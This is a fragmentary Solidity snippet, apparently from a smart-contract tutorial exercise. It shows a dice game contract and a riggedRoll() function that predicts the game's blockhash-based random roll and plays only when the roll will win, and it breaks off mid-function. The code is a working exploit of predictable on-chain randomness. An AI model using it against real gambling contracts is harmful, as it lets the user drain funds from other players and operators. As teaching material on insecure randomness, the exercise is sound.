...
contract DiceGame {
    ...
    function rollTheDice() public payable {
        ...
        console.log("DICE PREV HASH",block.number-1);
...
function withdraw(address _addr, uint256 _amount) external onlyOwner {
    ...
    require(_amount<=address(this).balance,"Amount must be less than or equal to the balance");
    (bool success,) = _addr.call{value:_amount}("");
    require(success,"Transfer failed");
}
    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() external {
        require(address(this).balance>=0.002 ether,"Not enough funds");
        bytes32 prevHash = blockhash(block.number - 1);
        console.log("RIGGED PREV HASH",block.number-1);
        uint256 nonce = diceGame.nonce();
        console.log("RIGGED NONCE",address(diceGame),nonce);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), nonce));
        console.log(uint256(hash));
        uint256 roll = uint256(hash) % 16;
        console.log(roll,"Roll in rigged dice");
        if(roll>2){
            return;
        }
